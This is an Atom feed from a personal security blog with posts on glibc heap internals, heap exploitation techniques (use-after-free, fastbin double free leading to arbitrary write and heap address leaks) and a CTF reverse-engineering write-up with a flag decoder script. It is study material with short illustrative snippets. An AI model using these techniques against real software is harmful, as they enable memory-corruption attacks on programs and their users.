<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Flier&#39;s Blog</title>
  
  <subtitle>F1r</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.flier.net.cn/"/>
  <updated>2017-10-27T04:42:48.301Z</updated>
  <id>http://blog.flier.net.cn/</id>
  
  <author>
    <name>F1r</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Heap-Exploitation-EXP</title>
    <link href="http://blog.flier.net.cn/2017/10/27/Heap-Exploitation-EXP/"/>
    <id>http://blog.flier.net.cn/2017/10/27/Heap-Exploitation-EXP/</id>
    <published>2017-10-27T04:27:15.000Z</published>
    <updated>2017-10-27T04:42:48.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap-Exploitation"><a href="#Heap-Exploitation" class="headerlink" title="Heap-Exploitation"></a>Heap-Exploitation</h1><h2 id="Preview"><a href="#Preview" class="headerlink" title="Preview"></a>Preview</h2><ul><li>Double Free<ul><li>Making <strong>malloc</strong> return an already allocated fastchunk</li></ul></li></ul><ul><li>Forging chunks<ul><li>Making <strong>malloc</strong> return a nearly arbitrary pointer</li></ul></li></ul><ul><li>Unlink Explit<ul><li>Getting (nearly) arbitrary write access</li></ul></li></ul><ul><li>Shrinking Free Chunks<ul><li>Making <strong>malloc</strong> return a chunk overlapping with an already allocated chunk</li></ul></li></ul><ul><li>House of Spirit<ul><li>Making <strong>malloc</strong> return a nearly arbitrary pointer</li></ul></li></ul><ul><li>House of Lore<ul><li>Making <strong>malloc</strong> return a nearly arbitrary pointer</li></ul></li></ul><ul><li>House of Force<ul><li>Making <strong>malloc</strong> return a nearly arbitrary pointer</li></ul></li></ul><ul><li>House of Einherjar<ul><li>Making <strong>malloc</strong> return a nearly arbitrary pointer</li></ul></li></ul><a id="more"></a><h2 id="First-Fit"><a href="#First-Fit" class="headerlink" title="First-Fit"></a>First-Fit</h2><h3 id="normal-bins"><a href="#normal-bins" class="headerlink" title="normal bins"></a>normal bins</h3><ul><li>Whenever any chunk (not a fastchunk) is <font color="red">free()’d</font>, it ends up in the <strong>unsorted</strong> bin. </li><li>Insertion happens at the <strong>HEAD</strong> of the list.</li><li>On requesting new chunks (not fast chunk), initially unsorted bins will be looked up as small bins will be empty. </li><li>If a single chunk is present in the unsorted bin, an exact check is not made and if the chunk’s &gt;= the one requested, it will be splited inti two and the chunk of requested size will be returned.</li></ul><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</div><div class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</div><div class="line"><span class="keyword">char</span>* c;</div></pre></td></tr></table></figure><p><img src="/2017/10/27/Heap-Exploitation-EXP/6229968.png" alt=""></p><h5 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">free</span>(a);</div></pre></td></tr></table></figure><p><img src="/2017/10/27/Heap-Exploitation-EXP/6388593.png" alt=""></p><h5 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c = <span class="built_in">malloc</span>(<span class="number">250</span>);</div></pre></td></tr></table></figure><p><img src="/2017/10/27/Heap-Exploitation-EXP/1333234.png" alt=""></p><h3 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h3><ul><li>This is also true in the case of fast chunks. Instead of <strong>freeing</strong> into unsorted bin, fast<br>chunks end up in fastbins . </li><li>As mentioned earlier, fastbins maintain a singly linked listand chunks are inserted and deleted from the HEAD end. This <strong>reverses</strong> the order of chunksobtained.</li></ul><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><h5 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b010</span></div><div class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b030</span></div><div class="line"><span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b050</span></div><div class="line"><span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b070</span></div></pre></td></tr></table></figure><blockquote><p><strong>fastbins list</strong></p><font color="red">HEAD -&gt; TAIL</font></blockquote><h5 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">free</span>(a);</div><div class="line"><span class="built_in">free</span>(b);</div><div class="line"><span class="built_in">free</span>(c);</div><div class="line"><span class="built_in">free</span>(d);</div></pre></td></tr></table></figure><blockquote><p><strong>fastbins list</strong></p><font color="red">HEAD -&gt; d -&gt; c -&gt; b -&gt; a -&gt; TAIL</font></blockquote><h5 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b070</span></div><div class="line">b = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b050</span></div></pre></td></tr></table></figure><blockquote><p><strong>fastbins list</strong></p><font color="red">HEAD -&gt; b -&gt; a -&gt; TAIL</font></blockquote><h5 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">c = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b030</span></div><div class="line">d = <span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// 0xe4b010</span></div></pre></td></tr></table></figure><blockquote><p><strong>fastbins list</strong></p><font color="red">HEAD -&gt; TAIL</font></blockquote><p>PS: <font color="blue"><br>Due to that Insertions happen at HEAD and removals happen at HEAD as well<br>a’ == d<br>b’ == c<br>c’ == b<br>d’ == a<br></font></p><h2 id="Use-after-Free-Vulnerability"><a href="#Use-after-Free-Vulnerability" class="headerlink" title="Use after Free Vulnerability"></a>Use after Free Vulnerability</h2><ul><li>malloc <em>might</em> return chunks that were ealier <font color="red">used and free()’d</font>.</li><li>Once a chunk has been free()’d, it <strong>should</strong> be assumed that the attacker can now control the data inside the chunk.</li><li>That particular chunk should never be used again. Instead, always allocate a new chunk.</li></ul><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *ch = <span class="built_in">malloc</span>(<span class="number">20</span>);</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">    ......</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="built_in">free</span>(ch);</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">    ......</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="keyword">if</span>(*ch == a)</div><div class="line">&#123;</div><div class="line">    <span class="comment">//do what</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><ul><li>Freeing a resource more than can lead to memory leaks. The allocator’s data structures get corrupted and can be exploited by an attacker. </li><li>In the sample program below, a fastbin chunk will be free()’d twice.</li><li>To avoid <code>double free</code> or <code>corruption (faststop)</code> security check by glibc, another chunk will be free()’d in between the two free()s.</li><li>The same chunk will be returned by <strong>two different <code>malloc</code></strong>. Both the pointers will point to the <strong>same memory address</strong>.</li><li>Attacker can change the chunk by using any pointer of these two.</li></ul><h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h3><h4 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//fastbins</span></div><div class="line">a = <span class="built_in">malloc</span>(<span class="number">10</span>);        <span class="comment">//0xa04010</span></div><div class="line">b = <span class="built_in">malloc</span>(<span class="number">10</span>);        <span class="comment">//0xa04030</span></div><div class="line">c = <span class="built_in">malloc</span>(<span class="number">10</span>);        <span class="comment">//0xa04050</span></div></pre></td></tr></table></figure><h4 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">free</span>(a);</div><div class="line"><span class="built_in">free</span>(b);</div><div class="line"><span class="built_in">free</span>(a); <span class="comment">//Double Free Here.</span></div></pre></td></tr></table></figure><p><img src="/2017/10/27/Heap-Exploitation-EXP/56308296.png" alt=""></p><h4 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">d = <span class="built_in">malloc</span>(<span class="number">10</span>);        <span class="comment">//0xa04010</span></div><div class="line">e = <span class="built_in">malloc</span>(<span class="number">10</span>);        <span class="comment">//0xa04030</span></div><div class="line">f = malooc(<span class="number">10</span>);        <span class="comment">//0xa04010</span></div></pre></td></tr></table></figure><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><h5 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h5><ol><li>Change bytes of malloc()d <strong>d</strong> to change <font color="red"><strong>FD</strong></font> to address of faked fastbin.</li><li>free() d, so f->FD == &amp;faked fastbin</li><li>free() f, so faked fastbin will be in fastbins list of this size.</li><li>malloc() for the same type of size fastbin chunk, we can control faked chunk mem.</li></ol><h5 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h5><ol><li>free() d, so f->FD will be set by glibc</li><li>puts(f), so we get f->FD as <strong>a address</strong> of a fastbin in <strong>HEAP</strong></li></ol><hr><font color="red"> to be continue ……</font>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap-Exploitation&quot;&gt;&lt;a href=&quot;#Heap-Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Heap-Exploitation&quot;&gt;&lt;/a&gt;Heap-Exploitation&lt;/h1&gt;&lt;h2 id=&quot;Preview&quot;&gt;&lt;a href=&quot;#Preview&quot; class=&quot;headerlink&quot; title=&quot;Preview&quot;&gt;&lt;/a&gt;Preview&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Double Free&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return an already allocated fastchunk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Forging chunks&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return a nearly arbitrary pointer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Unlink Explit&lt;ul&gt;
&lt;li&gt;Getting (nearly) arbitrary write access&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Shrinking Free Chunks&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return a chunk overlapping with an already allocated chunk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;House of Spirit&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return a nearly arbitrary pointer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;House of Lore&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return a nearly arbitrary pointer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;House of Force&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return a nearly arbitrary pointer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;House of Einherjar&lt;ul&gt;
&lt;li&gt;Making &lt;strong&gt;malloc&lt;/strong&gt; return a nearly arbitrary pointer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="PWN" scheme="http://blog.flier.net.cn/categories/PWN/"/>
    
    
      <category term="PWN" scheme="http://blog.flier.net.cn/tags/PWN/"/>
    
      <category term="HEAP" scheme="http://blog.flier.net.cn/tags/HEAP/"/>
    
  </entry>
  
  <entry>
    <title>CCF2016-reverse2</title>
    <link href="http://blog.flier.net.cn/2017/10/27/CCF2016-reverse2/"/>
    <id>http://blog.flier.net.cn/2017/10/27/CCF2016-reverse2/</id>
    <published>2017-10-27T04:21:45.000Z</published>
    <updated>2017-10-27T04:24:17.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CCF2016-软件破解2"><a href="#CCF2016-软件破解2" class="headerlink" title="CCF2016 软件破解2"></a>CCF2016 软件破解2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/2017/10/27/CCF2016-reverse2/851781.png" alt=""></p><p>此处代码段有无法解析的指令</p><p><img src="/2017/10/27/CCF2016-reverse2/917750.png" alt=""></p><p>程序在输入密码后，用输入的密码作为argv[1]，以原程序的path作为argv[0]开启了新的子线程</p><p><img src="/2017/10/27/CCF2016-reverse2/1000375.png" alt=""></p><a id="more"></a><p>此处向子线程写入了一些数据</p><p><img src="/2017/10/27/CCF2016-reverse2/1074109.png" alt=""></p><p>观察其参数，写入子线程的目标目标地址为<img src="/2017/10/27/CCF2016-reverse2/1138765.png" alt=""></p><p>直接手动patch</p><p><img src="/2017/10/27/CCF2016-reverse2/9369203.png" alt=""></p><p>反编译后观察加密</p><p><img src="/2017/10/27/CCF2016-reverse2/9426875.png" alt=""></p><p>与<code>wlcome to CFF te</code>异或后加1</p><p><img src="/2017/10/27/CCF2016-reverse2/9479578.png" alt=""></p><p>结果与之比对</p><p><img src="/2017/10/27/CCF2016-reverse2/9559234.png" alt=""></p><h2 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">xor_str=<span class="string">"elcome to CFF te"</span></div><div class="line"></div><div class="line">aim_str = <span class="string">"\x25\x5c\x5c\x2b\x2f\x5d\x19\x36\x2c\x64\x72\x76\x80\x66\x4e\x52"</span></div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> len(xor_str),len(aim_str)</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(xor_str)):</div><div class="line">    flag += chr(ord(xor_str[x]) ^ ord(aim_str[x]) - <span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CCF2016-软件破解2&quot;&gt;&lt;a href=&quot;#CCF2016-软件破解2&quot; class=&quot;headerlink&quot; title=&quot;CCF2016 软件破解2&quot;&gt;&lt;/a&gt;CCF2016 软件破解2&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2017/10/27/CCF2016-reverse2/851781.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;此处代码段有无法解析的指令&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2017/10/27/CCF2016-reverse2/917750.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;程序在输入密码后，用输入的密码作为argv[1]，以原程序的path作为argv[0]开启了新的子线程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2017/10/27/CCF2016-reverse2/1000375.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="REVERSE" scheme="http://blog.flier.net.cn/categories/REVERSE/"/>
    
    
      <category term="REVERSE" scheme="http://blog.flier.net.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>Heap-Exploitation-base-knowledge-notes</title>
    <link href="http://blog.flier.net.cn/2017/10/24/Heap-Exploitation-base-knowledge-notes/"/>
    <id>http://blog.flier.net.cn/2017/10/24/Heap-Exploitation-base-knowledge-notes/</id>
    <published>2017-10-24T13:58:21.000Z</published>
    <updated>2017-10-24T14:14:30.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap-Exploitation"><a href="#Heap-Exploitation" class="headerlink" title="Heap Exploitation"></a>Heap Exploitation</h1><h2 id="Base-Knowledge"><a href="#Base-Knowledge" class="headerlink" title="Base Knowledge"></a>Base Knowledge</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>&#123;</span></div><div class="line">    INTERNAL_SIZE_T        mchunk_prev_size;    <span class="comment">/*Size of previous chunk (if free)        */</span></div><div class="line">    INTERNAL_SIZE_T        mchunk_size;         <span class="comment">/*Size in bytes, including overhead        */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>                    <span class="comment">/*double links  ----  used only if free.*/</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bf</span>;</span></div><div class="line">    <span class="comment">/*only used for large blocks: pointer to next larger size*/</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></div></pre></td></tr></table></figure><a id="more"></a><h3 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h3><p><img src="/2017/10/24/Heap-Exploitation-base-knowledge-notes/3589312.png" alt=""></p><p><strong>mem</strong> is the pointer which is returned to the user.</p><h3 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h3><p><img src="/2017/10/24/Heap-Exploitation-base-knowledge-notes/3665609.png" alt=""></p><p>Free chunks maintain themselves in a circular doubly linked list.</p><ol><li><font color="red"><strong>P(PREV_INUSE)</strong></font>: 0 when previous chunk (not the prev chunk in the linked list, but the one directly before it in memory) is free (and hence the size of previous chunk is stored in the first field). The very first chunk allocated has this bit set. If the bit set to 1, we cannot determine the size of the previous chunk.</li><li><font color="red"><strong>M(IS_MMAPPED)</strong></font>: The chunk is obtained through <strong>mmap</strong>. The other two bits are ignored. <strong>mmapped</strong> chunks are neither in an <strong>arena</strong>, not adjacent to a free chunk.</li><li><font color="red"><strong>A(NON_MAIN_ARENA)</strong></font>: 0 for chunks in the main arena. Each thread spawned received its own <strong>arena</strong> and for those chunks, this bit is set.</li></ol><p>PS: <font color="blue">fastbins are not included in the set described above.</font></p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>This structure represents the details of an Arena. The main threads arena is a global variable and not part of the heap segment.Arena headers( <strong>malloc_chunk</strong> structures) for other threads are themselves stored in the heap segment. Non main arena can have multiple heaps associated with them.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span>    <span class="title">malloc_state</span> &#123;</span></div><div class="line">    __libc_lock_define (, mutex);</div><div class="line">    <span class="keyword">int</span> flags;</div><div class="line">    <span class="comment">/* Fastbins */</span></div><div class="line">    mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line">    mchunkptr top;</div><div class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line">    mchunkptr last_remainder;</div><div class="line">    <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">    mchunkptr bin[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line">    </div><div class="line">    <span class="comment">/* Bitmap of bins */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line">    </div><div class="line">    <span class="comment">/* Linked list */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line">    <span class="comment">/* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena,c, */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line">    <span class="comment">/* Number of threands attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */</span></div><div class="line">    INTERNAL_SIZE_T attached_threads;</div><div class="line">    <span class="comment">/* Memory allocated from the system in this arena. */</span></div><div class="line">    INTERNAL_SIZE_T system_mem;</div><div class="line">    INTERNAL_SIZE_T max_system_mem;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">mstate</span>;</span></div></pre></td></tr></table></figure><h3 id="Bins-and-Chunks"><a href="#Bins-and-Chunks" class="headerlink" title="Bins and Chunks"></a>Bins and Chunks</h3><p>A bin is a list (doubly or singly linked list) of free (non-allocated) chunks. Bins are differentiated based on the size of chunks they contain:</p><ol><li>Fastbin</li><li>Unsorted bin</li><li>Small bin</li><li>Large bin</li></ol><p>PS: Unsorted, small and large bins are maintained using a single array:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> * <span class="title">mchunkptr</span>;</span></div><div class="line">mchunkptr bins[]; <span class="comment">//Array of pointers to chunks</span></div></pre></td></tr></table></figure></p><h4 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h4><p>The 10 types of fastbins each have chunks of size: 16, 24, 32, 40, 48, 56, 64, 72, 80 and 88. Sizes mentioned here include metadata as well. To store chunks, 4 fewer bytes will be available (on a platform where pointers use 4 bytes). Only <strong>prev_size</strong> and <strong>size</strong> field of this chunk will hold meta data for allocated chunks.</p><p>PS: <font color="blue"> No two contiguous free fast chunks coalesce together, which is not different with normal bins.</font></p><h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>There is only 1 unsorted bin. Small and large chunks, when freed, end up in this bin. The primary purpose of this bin is to act as a cache layer to speed up allocation and deallocation requests.</p><h4 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h4><p>Each small bin maintains a <strong>doubly-linked</strong> list. Insertions happen at “HEAD” while removals happen at the ‘TAIL’(in a FIFO manner).<br>The 64 bins have sizes: 16, 24, …… 504 bytes.</p><p>PS: <font color="blue">While freeing, small chunks may be coalesced toghether before ending up in unsorted bins.</font></p><h4 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h4><p>Each large bin maintains a <strong>doubly-linked</strong> list. A particular chunks of different sizes, sorted in decreasing order. Insertions and removal happed at any position within the list.</p><p>The first 32 bins contain chunks which are 64 bytes apart:</p><p>1st bin: 512 - 568 bytes<br>2nd bin: 576 - 632 bytes<br>…<br>…</p><p><img src="/2017/10/24/Heap-Exploitation-base-knowledge-notes/6875765.png" alt=""></p><h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>It is the chunk which borders the top of an arena. While servicing ‘malloc’ requests, it is used as the last resort. If still more size is required, it can grow using the <strong>sbrk</strong> system call. The <strong>PREV_INUSE</strong> flag is always set for the top chunk.</p><h4 id="Last-remainder-chunk"><a href="#Last-remainder-chunk" class="headerlink" title="Last remainder chunk"></a>Last remainder chunk</h4><p>It is the chunk obtained from the last split. Sometimes, when exact size chunks are not available, bigger chunks are split into two. One part is returned to user whereas the other becomes the last remainder chunk.</p><h3 id="Internal-functions"><a href="#Internal-functions" class="headerlink" title="Internal functions"></a>Internal functions</h3><h4 id="arena-get-ar-ptr-size"><a href="#arena-get-ar-ptr-size" class="headerlink" title="arena_get(ar_ptr, size)"></a>arena_get(ar_ptr, size)</h4><p>Acquires an arena and locks the corresponding mutex.</p><ul><li><strong>ar_ptr</strong> is set to the pointer to the corresponding arena.</li><li><strong>size</strong> is set to how much memory will be required immediately.</li></ul><h4 id="sysmalloc-TODO"><a href="#sysmalloc-TODO" class="headerlink" title="sysmalloc [TODO]"></a>sysmalloc [TODO]</h4><p>sysmalloc handles malloc cases requiring more memory from the system.<br>On entry, it is assumed that assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced.</p><h4 id="void-alloc-perturb-char-p-size-t-n"><a href="#void-alloc-perturb-char-p-size-t-n" class="headerlink" title="void alloc_perturb(char *p, size_t n)"></a>void alloc_perturb(char *p, size_t n)</h4><p>If <strong>perturb_byte</strong> (tunable parameter for malloc using <strong>M_PERTURB</strong>) is non-zero (by default it is 0), sets the <strong>n</strong> bytes pointed to by <strong>p</strong> to be equal to <strong>perturb_byte</strong> ^ 0xff.</p><blockquote><p>调用alloc_perturb对用户使用的内存进行初始化，之后就会返回该内存的指针（在<strong>_int_malloc(mstate av, size_t bytes)</strong>函数中)</p></blockquote><h4 id="void-free-perturb-char-p-size-t-n"><a href="#void-free-perturb-char-p-size-t-n" class="headerlink" title="void free_perturb(char *p, size_t n)"></a>void free_perturb(char *p, size_t n)</h4><p>If <strong>perturb_byte</strong> (tunable parameter for malloc using <strong>M_PERTURB</strong>) is non-zero (by default it is 0), sets the <strong>n</strong> bytes pointed to by <strong>p</strong> to be equal to <strong>perturb_byte</strong>.</p><h4 id="void-malloc-init-state-mstate-av"><a href="#void-malloc-init-state-mstate-av" class="headerlink" title="void malloc_init_state(mstate av)"></a>void malloc_init_state(mstate av)</h4><ol><li>For non fast bins, create empty circular linked lists for each bin.</li><li>Set <strong>FASTCHUNKS_BIT</strong> flag for av.</li><li>Initialize <strong>av-&gt;top</strong> to the first unsorted chunk.</li></ol><h4 id="unlink-AV-P-BK-FD"><a href="#unlink-AV-P-BK-FD" class="headerlink" title=" unlink(AV, P, BK, FD)"></a><font color="red"> unlink(AV, P, BK, FD)</font></h4><p>This is a defined macro which removes a chunk from a bin.</p><ol><li>Check if chunk size is equal to the previous size set in the next chunk.</li><li>Check if <strong>P-&gt;fd-&gt;bk == P</strong> and <strong>P-&gt;bk-&gt;fd == P</strong>.</li><li>Adjust forward and backward pointers of neighboring chunks 